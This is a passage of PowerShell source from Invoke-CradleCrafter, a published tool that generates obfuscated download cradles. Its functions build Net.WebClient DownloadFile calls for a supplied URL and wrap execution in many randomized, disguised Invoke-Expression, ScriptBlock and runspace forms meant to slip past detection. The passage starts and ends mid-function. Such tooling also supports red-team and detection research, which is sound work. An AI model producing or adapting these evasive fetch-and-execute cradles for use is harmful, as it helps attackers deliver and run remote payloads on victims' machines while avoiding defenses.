                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar5)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            # Since $GetVar5 is a variable we will remove any quotes that may be encapsulating it (only for ::ReadAllBytes option).
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar5)
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar5$PathQuoted"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadFile"
                        $CommandArray += "$GetVar1.$GetVar4($GetVar2,$GetVar5)"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Remove single quotes when DownloadFile is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadFile.Contains("'DownloadFile'"))
                        {
                            $DownloadFile = $DownloadFile.Replace("'DownloadFile'","DownloadFile")
                        }

                        If($DownloadFile.EndsWith(')') -OR $DownloadFile.EndsWith(')0>>>'))
                        {
                            $DownloadFileInvoke = $DownloadFile + '.Invoke'
                        }
                        Else
                        {
                            $DownloadFileInvoke = $DownloadFile
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"

                        $CommandArray2 += "$SetVar2'$Url'"
                        $CommandArray2 += "$SetVar5$PathQuoted"
                        $CommandArray2 += "$GetVar1.$DownloadFileInvoke($GetVar2,$GetVar5)"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag) -OR $IsDiskCradle)
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If($Invoke -ne $InvokeTag)
                            {
                                $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray2 += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_012]   + $CommandArray[3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_012] + $CommandArray2[3,4,5,6]  -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 5

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadFile         = $DownloadFile.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadFileWithTags = $DownloadFileWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,($GetVar4 + '.Invoke'))
                    $GetVar4         = $GetVar4 + '.Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','NewObject','DownloadFile')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadFile in single quotes if basic syntax is used.
                        If($DownloadFile.Contains('DownloadFile'))
                        {
                            $DownloadFileWithTags = $DownloadFileWithTags.Trim("'").Replace($DownloadFile,("'" + $DownloadFile + "'")).Replace("''","'")
                            $DownloadFile         = "'" + $DownloadFile.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar5)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            # Since $GetVar5 is a variable we will remove any quotes that may be encapsulating it (only for ::ReadAllBytes option).
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar5)
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar5$PathQuoted"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadFile"
                        
                        If($GetVar4.Contains('.Value'))
                        {
                            $CommandArray += "$GetVar1." + $GetVar4.Replace('(','((').Replace('.Value','.Value)') + "($GetVar2,$GetVar5)"
                        }
                        Else
                        {
                            $CommandArray += "$GetVar1.$GetVar4($GetVar2,$GetVar5)"
                        }

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Remove single quotes when DownloadFile is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadFile.Contains("'DownloadFile'"))
                        {
                            $DownloadFile = $DownloadFile.Replace("'DownloadFile'","DownloadFile")
                        }

                        If($DownloadFile.EndsWith(')') -OR $DownloadFile.EndsWith(')0>>>'))
                        {
                            $DownloadFileInvoke = $DownloadFile + '.Invoke'
                        }
                        Else
                        {
                            $DownloadFileInvoke = $DownloadFile
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"

                        $CommandArray2 += "$SetVar2'$Url'"
                        $CommandArray2 += "$SetVar5$PathQuoted"
                        $CommandArray2 += "$GetVar1.$DownloadFileInvoke($GetVar2,$GetVar5)"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag) -OR $IsDiskCradle)
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If($Invoke -ne $InvokeTag)
                            {
                                $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray2 += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_012]   + $CommandArray[3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_012] + $CommandArray2[3,4,5,6]  -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        default {Write-Error "An invalid `$Cradle value ($Cradle) was passed to switch block for Out-Cradle."; Exit}
    }

    If($PSBoundParameters['ReturnAsArray'])
    {
        # Remove any remainign ModuleAutoLoad tags used for PS3.0+ when dealing with PS1.0 syntax for GetCmdlet method before required modules are loaded.
        If($CradleSyntaxOptions[0].Contains($ModuleAutoLoadTag))
        {
            $CradleSyntaxOptions[0] = $CradleSyntaxOptions[0].Replace($ModuleAutoLoadTag,'')
            $CradleSyntaxOptions[1] = $CradleSyntaxOptions[1].Replace($ModuleAutoLoadTag,'')
        }

        If($AllOptionSelected)
        {
            # When All option is selected then Rearrange is set to 9 and the maximum option(s) is selected in each Switch block as there are differing numbers per cradle type.
            # We will overwrite the correct Rearrange option in $Script:TokensUpdatedThisIteration before returning it to Invoke-CradleCrafter.ps1.
            ForEach($Token in $Script:TokensUpdatedThisIteration)
            {
                If($Token[0] -eq 'Rearrange') {$Token[1] = $Rearrange}
            }
        }

        $CradleSyntaxOptions[2] = @($Script:TokensUpdatedThisIteration)

        # Return both cradle syntax and cradle syntax with tags for display purposes.
        Return $CradleSyntaxOptions
    }
    Else
    {
        # Return only the cradle syntax, NOT an array with cradle syntax and cradle syntax with tags for display purposes.
        # This will be used when CLI is used and not tagged result is needed for display purposes.
        Return $CradleSyntaxOptions[0]
    }
}


Function Set-GetSetVariables
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates various levels of randomized Get-Variable and Set-Variable syntax and variable names if not already defined or if current option is Rearrange or All.

Invoke-CradleCrafter Function: Set-GetSetVariables
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-GetVariable and Out-SetVariable (all located in Out-Cradle.ps1)
Optional Dependencies: None
 
.DESCRIPTION

Set-GetSetVariables generates various levels of randomized Get-Variable and Set-Variable syntax and variable names if not already defined or if current option is Rearrange or All.

.PARAMETER NumberOfVarNames

Specifies the number of Get-Variable and Set-Variable syntaxes to generate.

.PARAMETER VarOptionsIndex

Specifies the level of randomization for syntax:
0) $Var='value'; $Var
1) (Set-Variable 'Var' 'value'); (Get-Variable 'Var').Value

.EXAMPLE

C:\PS> $RandomVarName1 = 'var1'; $RandomVarName2 = 'var2'; (Set-GetSetVariables 2 0) | ForEach-Object {(Get-Variable $_).Value}

$var1=
$var1
$var2=
$var2

C:\PS> $RandomVarName1 = 'var1'; $RandomVarName2 = 'var2'; (Set-GetSetVariables 2 1) | ForEach-Object {(Get-Variable $_).Value}

SI Variable:var1 
(Get-Variable var1 -ValueO)
Set-Item Variable:var2 
(GV var2).Value

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [ValidateSet(1,2,3,4,5,6,7,8)]
        [Int]
        $NumberOfVarNames,

        [ValidateNotNullOrEmpty()]
        [ValidateSet(0,1)]
        [Int]
        $VarOptionsIndex
    )

    $NewVarArray = @()

    For($j=1; $j -le $NumberOfVarNames; $j++)
    {
        $SetVarName = 'SetVar' + $j
        $GetVarName = 'GetVar' + $j

        # Set default Get/Set variable syntax.
        $SetVariableRandom = '$' + $VarTag1 + '='
        $GetVariableRandom = '$' + $VarTag1

        # If $VarOptionsIndex isn't the lowest level then keep calling Out-GetVariable and Out-SetVariable until a non-default '$' variable syntax is returned.
        If($VarOptionsIndex -gt 0)
        {
            # Generate random Get Variable syntax.
            $GetVariableRandom = Out-GetVariable $VarTag1
            While($GetVariableRandom.StartsWith('$'))
            {
                $GetVariableRandom = Out-GetVariable $VarTag1
            }

            # Generate random Set Variable syntax.
            $SetVariableRandom = Out-SetVariable $VarTag1
            While($SetVariableRandom.StartsWith('$'))
            {
                $SetVariableRandom = Out-SetVariable $VarTag1
            }
        }

        # If both the local variable and script-level variable exist and don't match then overwrite the script-level variable with the local variable (as it is our current value).
        If(((Test-Path ('Variable:' + $SetVarName))) -AND ((Get-Variable $SetVarName).Value -ne (Get-Variable $SetVarName -Scope 'Script').Value))
        {
            Set-Variable $SetVarName (Get-Variable $SetVarName).Value -Scope 'Script'
        }
        If(((Test-Path ('Variable:' + $GetVarName))) -AND ((Get-Variable $GetVarName).Value -ne (Get-Variable $GetVarName -Scope 'Script').Value))
        {
            Set-Variable $GetVarName (Get-Variable $GetVarName).Value -Scope 'Script'
        }

        # Create new randomized Get and Set variable syntax and variable names if they do not already exist (i.e. being passed in via TokenArray) or if current option is Rearrange or All.
        If(!(Test-Path ('Variable:' + $SetVarName)) -OR ($TokenNameUpdatedThisIteration -eq 'Rearrange') -OR $AllOptionSelected)
        {
            Set-Variable $SetVarName $SetVariableRandom.Replace($VarTag1,(Get-Variable ('RandomVarName' + $j)).Value) -Scope 'Script'
        }
        If(!(Test-Path ('Variable:' + $GetVarName)) -OR ($TokenNameUpdatedThisIteration -eq 'Rearrange') -OR $AllOptionSelected)
        {
            Set-Variable $GetVarName $GetVariableRandom.Replace($VarTag1,(Get-Variable ('RandomVarName' + $j)).Value) -Scope 'Script'
        }
    
        # If Rearrange or All is the option being run then add appropriate tags to these Get/Set-Variable variables.
        $TagStart = ''
        $TagEnd   = ''
        If(($TokenNameUpdatedThisIteration -eq 'Rearrange') -OR $AllOptionSelected)
        {
            $TagStart = '<<<0'
            $TagEnd   = '0>>>'
        }

        Set-Variable ($SetVarName + 'WithTags') ($TagStart + (Get-Variable ($SetVarName) -Scope 'Script').Value + $TagEnd) -Scope 'Script'
        Set-Variable ($GetVarName + 'WithTags') ($TagStart + (Get-Variable ($GetVarName) -Scope 'Script').Value + $TagEnd) -Scope 'Script'

        $NewVarArray += ($SetVarName)
        $NewVarArray += ($GetVarName)

        # Add Set and Get syntaxes to $Script:TokensUpdatedThisIteration to be returned with everything else so we can maintain the state of these values for each subsequent call.
        $Script:TokensUpdatedThisIteration += , @($SetVarName,(Get-Variable ($SetVarName) -Scope 'Script').Value)
        $Script:TokensUpdatedThisIteration += , @($GetVarName,(Get-Variable ($GetVarName) -Scope 'Script').Value)
    }

    Return $NewVarArray
}


Function Out-EncapsulatedInvokeExpression
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates random syntax for invoking input PowerShell command.

Invoke-CradleCrafter Function: Out-EncapsulatedInvokeExpression
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-GetVariable, Out-SetVariable, Out-PsGetCmdlet (all located in Out-Cradle.ps1)
Optional Dependencies: None
 
.DESCRIPTION

Out-EncapsulatedInvokeExpression generates random syntax for invoking PowerShell expressions, scriptblocks, etc. It contains multiple invocation types denoted by $InvokeLevel input variable.

.PARAMETER InvokeLevel

Specifies the invocation type from which a randomized syntax will be generated.

.EXAMPLE

C:\PS> Out-EncapsulatedInvokeExpression 2

<INVOKETAG>|Invoke-Expression

C:\PS> Out-EncapsulatedInvokeExpression 3

.(Get-Alias *EX) <INVOKETAG>

C:\PS> Out-EncapsulatedInvokeExpression 9

.( ([String]''.Chars)[11,18,19]-Join'')<INVOKETAG>

C:\PS> Out-EncapsulatedInvokeExpression 10

Invoke-AsWorkflow -Expr (<INVOKETAG>)

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [ValidateSet(1,2,3,4,5,6,7,8,9,10,11,12)]
        [Int]
        $InvokeLevel
    )

    # Flag substrings
    $FullArgument            = "-Expression"
    $ExpressionFlagSubString = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))

    # Create random variable name with random case for certain invocation syntax options.
    $VarNameCharacters   = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9')
    $RandomInvokeVarName = (Get-Random -Input $VarNameCharacters -Count (Get-Random -Input @(1..3)) | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''

    # Generate random Set and Get syntax for newly created variable name above.
    $SetRandomInvokeVarName = Out-SetVariable $RandomInvokeVarName
    $GetRandomInvokeVarName = Out-GetVariable $RandomInvokeVarName

    # Set all necessary variables to be combined together in below Switch block for each $InvokeLevel value passed into this function.
    $InvocationOperator     = Get-Random -Input @('.','&')
    $RandomInvokeCommand    = Get-Random -Input @('Invoke-Command','ICM','.','&')
    $RandomIEX              = Get-Random -Input @('IE*','I*X','*EX')
    $RandomInvokeExpression = Get-Random -Input @('In*-Ex*ion','*-Ex*n','*e-*pr*n','*e-*press*','*ke-*pr*','*e-Ex*','I*e-E*','I*-E*n','In*ssi*')
    
    # Generate random ForEach-Object cmdlet syntax.
    $ForEach  = Get-Random -Input @('ForEach-Object','ForEach','%')
    $ForEach2 = Get-Random -Input @('ForEach-Object','ForEach','%')
    
    Switch($InvokeLevel)
    {
        1 {
            # No Invoke
            
            $Result = $InvokeTag
        }
        2 {
            # IEX/Invoke-Expression
            
            $Invoke = Get-Random -Input @('Invoke-Expression','IEX')

            $Result = Get-Random -Input @(($Invoke + ' ' + $InvokeTag),($Invoke + '(' + $InvokeTag + ')'),($InvokeTag + '|' + $Invoke))
        }
        3 {
            # Get-Alias/GAL/Alias
            
            $GetAliasRandom = Get-Random -Input @('Get-Alias ','GAL ','Alias ',((Get-Random -Input @('DIR','Get-ChildItem','GCI','ChildItem','LS','Get-Item','GI','Item')) + (Get-Random -Input @(' Alias:\',' Alias:/',' Alias:'))))

            $Invoke = "$InvocationOperator($GetAliasRandom$RandomIEX)"

            $Result = Get-Random -Input @(($Invoke + ' ' + $InvokeTag),($Invoke + '(' + $InvokeTag + ')'),($InvokeTag + '|' + $Invoke))
        }
        4 {
            # Get-Command/GCM --  COMMAND only works in PS3.0+ so we're not including it here.
            
            $Invoke = $InvocationOperator + '(' + (Get-Random -Input @('Get-Command','GCM','COMMAND')) + ' ' + $RandomInvokeExpression + ')'
    
            $Result = Get-Random -Input @(($Invoke + ' ' + $InvokeTag),($Invoke + '(' + $InvokeTag + ')'),($InvokeTag + '|' + $Invoke))
        }
        5 {
            # $ExecutionContext.InvokeCommand.GetCommand/GetCmdlet/GetCmdlets/GetCommandName

            # Generate PS 1.0 syntax for getting command/cmdlet.
            $GetCmdletIEX = Out-PsGetCmdlet $RandomInvokeExpression

            $Result = Get-Random -Input @(($GetCmdletIEX + $InvokeTag),($InvokeTag + '|' + $GetCmdletIEX))
        }
        6 {
            # $ExecutionContext.InvokeCommand.InvokeScript

            # Handle syntax differently if PostCradleCommand is present or not since it will need to be combined with our regular cradle result since everything must be executed within the same ScriptBlock/RunSpace.
            If($Command)
            {
                $InvokeTag = $InvokeTag + $CommandEscapedStringTag
            }

            # Generate numerous ways to invoke $InvokeTag.
            $InvokeSyntax  = @()
            $InvokeSyntax += "$ExecContextVariable.$InvokeCommand.$InvokeScript($InvokeTag)"
            $InvokeSyntax += "$ExecContextVariable|$ForEach{$CurrentItemVariable.$InvokeCommand.$InvokeScript($InvokeTag)}"
            $InvokeSyntax += "$ExecContextVariable.$InvokeCommand|$ForEach{$CurrentItemVariable2.$InvokeScript($InvokeTag)}"
            $InvokeSyntax += "$ExecContextVariable|$ForEach{$CurrentItemVariable.$InvokeCommand|$ForEach2{$CurrentItemVariable2.$InvokeScript($InvokeTag)}}"

            $Result = Get-Random -Input $InvokeSyntax            
        }
        7 {
            # ICM/Invoke-Command/.Invoke()/.InvokeReturnAsIs() + ScriptBlock Conversion
            
            # Handle syntax differently if PostCradleCommand is present or not since it will need to be combined with our regular cradle result since everything must be executed within the same ScriptBlock/RunSpace.
            If($Command)
            {
                $InvokeTag = $InvokeTag + $CommandEscapedStringTag
            }

            # Select random syntax for converting expression or command to a script block.
            $ScriptBlockConversionSyntax  = @()
            $ScriptBlockConversionSyntax += "[ScriptBlock]::Create($InvokeTag)"
            $ScriptBlockConversionSyntax += Get-Random -Input @("$ExecContextVariable.$InvokeCommand.$NewScriptBlock($InvokeTag)","($ExecContextVariable|$ForEach{$CurrentItemVariable.$InvokeCommand.$NewScriptBlock($InvokeTag)})","($ExecContextVariable.$InvokeCommand|$ForEach{$CurrentItemVariable2.$NewScriptBlock($InvokeTag)})","($ExecContextVariable|$ForEach{$CurrentItemVariable.$InvokeCommand|$ForEach2{$CurrentItemVariable2.$NewScriptBlock($InvokeTag)}})")
            $ScriptBlockConversion = Get-Random -Input $ScriptBlockConversionSyntax
    
            $InvokeMethod = Get-Random -Input @('.Invoke()','.InvokeReturnAsIs()')
            $Result = Get-Random -Input @(($RandomInvokeCommand + '(' + $ScriptBlockConversion + ')' ),($ScriptBlockConversion + $InvokeMethod))
        }
        8 {
            # PS Runspace - Thanks to noted Blue Teamer, Matt Graeber (@mattifestation), for this invocation suggestion.

            # Generate random substrings for Get-Member wildcard syntax for AddScript and Dispose methods.
            $AddScriptMethodString = Get-Random -Input @('A*Sc*','A*S*pt','*Sc*','*cri*','*rip*','*ip*','*pt*','*pt','A*pt','*ddSc*','*d*rip*','*S*i*t','*d*c*t')
            $DisposeMethodString   = Get-Random -Input @('D*','Di*','D*e','*isp*','*spo*','*pos*','*pose*','*se','D*p*')
            
            # Set alternate syntax for members used in Runspace syntax.
            $AddScriptWithVariable        = Get-Random -Input @('AddScript',"((`$$RandomInvokeVarName|$GetMemberRandom)[5].Name).Invoke","(($GetRandomInvokeVarName.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$AddScriptMethodString'}).Name).Invoke","(($GetRandomInvokeVarName|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$AddScriptMethodString'}).Name).Invoke")
            $AddScriptWithoutVariable     = Get-Random -Input @('AddScript',"(([PowerShell]::Create()|$GetMemberRandom)[5].Name).Invoke","(([PowerShell]::Create().PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$AddScriptMethodString'}).Name).Invoke","(([PowerShell]::Create()|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$AddScriptMethodString'}).Name).Invoke")
            $DisposeMethodWithVariable    = Get-Random -Input @('Dispose()',"(($GetRandomInvokeVarName.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$DisposeMethodString'}).Name).Invoke()","(($GetRandomInvokeVarName|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$DisposeMethodString'}).Name).Invoke()")
            $DisposeMethodWithoutVariable = Get-Random -Input @('Dispose()',"(([PowerShell]::Create().PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$DisposeMethodString'}).Name).Invoke()","(([PowerShell]::Create()|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$DisposeMethodString'}).Name).Invoke()")

            # Add extra encapsulation of parentheses if Set-Variable syntax is used.
            $PowerShellCreatePotentiallyEncapsulated = "[PowerShell]::Create()"
            If($SetRandomInvokeVarName.EndsWith(' '))
            {
                $PowerShellCreatePotentiallyEncapsulated = '(' + $PowerShellCreatePotentiallyEncapsulated + ')'
            }

            # Handle syntax differently if PostCradleCommand is present or not since it will need to be combined with our regular cradle result since everything must be executed within the same ScriptBlock/RunSpace.
            If($Command)
            {
                # Generate numerous ways to invoke a combined $InvokeTag and $CommandTag.
                $InvokeSyntax  = @()
